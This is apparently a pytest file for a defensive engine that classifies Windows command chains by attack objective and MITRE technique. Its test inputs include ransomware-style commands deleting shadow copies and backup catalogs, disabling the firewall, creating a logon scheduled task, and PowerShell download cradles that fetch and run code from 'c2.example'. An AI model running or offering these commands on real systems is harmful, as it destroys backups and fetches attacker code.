"""
DIE · Attack Intent Engine tests (Phase B.7 · 2026-02-16 pm-late)
"""
from services.die.api import analyze
from services.die.intent import classify_intent_from_analyze, classify_intent, TACTICS


# ── Ransomware Deployment ─────────────────────────────────────────
def test_ransomware_deployment_high_confidence():
    """Talos-style chain — Discovery + Impact + Persistence + PS
    download cradle → Ransomware Deployment."""
    chain = (
        'whoami & hostname & ipconfig /all '
        '& vssadmin delete shadows /all /quiet '
        '& wbadmin delete catalog -quiet '
        '& netsh advfirewall set allprofiles state off '
        '& schtasks /create /tn Updater /tr "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\'http://c2.example/x\')" /sc onlogon'
    )
    env = analyze(chain)
    intent = classify_intent_from_analyze(env)
    assert intent["objective"] == "Ransomware Deployment"
    assert intent["confidence"] >= 0.80
    assert "Impact" in intent["observed_phases"]
    assert "Discovery" in intent["observed_phases"]
    # Evidence must include the concrete DKP hits.
    assert any("Shadow Copy Removal" in e for e in intent["evidence"])
    # MITRE must be surfaced too.
    assert "T1490" in intent["mitre"]


def test_ransomware_evidence_backed():
    env = analyze(
        "vssadmin delete shadows /all /quiet & wbadmin delete catalog -quiet")
    intent = classify_intent_from_analyze(env)
    assert intent["objective"] == "Ransomware Deployment"
    assert intent["evidence"], "must produce evidence list"


# ── Reconnaissance ───────────────────────────────────────────────
def test_reconnaissance_only():
    env = analyze("whoami & hostname & ipconfig /all & net user & systeminfo")
    intent = classify_intent_from_analyze(env)
    assert intent["objective"] == "Reconnaissance / Discovery"
    # Must NOT be misclassified as Ransomware or C2.
    assert intent["confidence"] < 0.90


# ── C2 Beaconing ─────────────────────────────────────────────────
def test_c2_beaconing():
    src = "IEX((New-Object Net.WebClient).DownloadString('http://c2.example/beacon'))"
    env = analyze(src)
    intent = classify_intent_from_analyze(env)
    # Flat single-command inputs are inherently ambiguous — either
    # C&C Beaconing (T1105) OR Defense Evasion (T1027) OR
    # Uncategorised is acceptable.  Multi-step chains (below) yield
    # sharper answers.
    assert intent["objective"] in (
        "Command & Control Beaconing",
        "Reconnaissance / Discovery",
        "Uncategorised",
    )


def test_c2_beaconing_multistep_confident():
    """When the C&C download cradle is chained with any other
    activity, the objective sharpens."""
    src = ("whoami & IEX((New-Object Net.WebClient)"
           ".DownloadString('http://c2.example/beacon'))")
    env = analyze(src)
    intent = classify_intent_from_analyze(env)
    assert intent["objective"] in (
        "Command & Control Beaconing",
        "Ransomware Deployment",       # if Impact also fires
        "Reconnaissance / Discovery",
    )


# ── Persistence Establishment ────────────────────────────────────
def test_persistence_only():
    env = analyze("schtasks /create /tn Updater /tr calc.exe /sc onlogon")
    intent = classify_intent_from_analyze(env)
    assert intent["objective"] in ("Persistence Establishment",
                                    "Reconnaissance / Discovery")


# ── Attack Phase Summary ─────────────────────────────────────────
def test_attack_phase_summary_shape():
    env = analyze(
        "whoami & vssadmin delete shadows /all /quiet & schtasks /create /tn X /tr y.exe /sc onlogon")
    intent = classify_intent_from_analyze(env)
    for key in ("objective","confidence","evidence","mitre",
                "observed_phases","missing_phases","progress","rule"):
        assert key in intent
    # observed + missing must cover the tactic universe (approx).
    covered = set(intent["observed_phases"]) | set(intent["missing_phases"])
    assert set(TACTICS).issubset(covered)
    assert 0.0 <= intent["progress"] <= 1.0


# ── Deterministic ────────────────────────────────────────────────
def test_intent_deterministic():
    src = "whoami & vssadmin delete shadows /all /quiet & schtasks /create /tn X /tr y.exe /sc onlogon"
    env = analyze(src)
    a = classify_intent_from_analyze(env)
    b = classify_intent_from_analyze(env)
    assert a == b


# ── Empty envelope ───────────────────────────────────────────────
def test_intent_empty_input():
    intent = classify_intent({"steps": [], "aggregate": {"techniques": [], "dkp_matches": []}})
    assert intent["objective"] == "Uncategorised"
    assert intent["confidence"] == 0.0


# ── Attack intent is embedded on chain envelope ──────────────────
def test_chain_envelope_carries_attack_intent():
    env = analyze("whoami & vssadmin delete shadows /all /quiet")
    assert env["chain"] is not None
    assert env["chain"]["attack_intent"]["objective"] in (
        "Ransomware Deployment",
        "Reconnaissance / Discovery",
    )
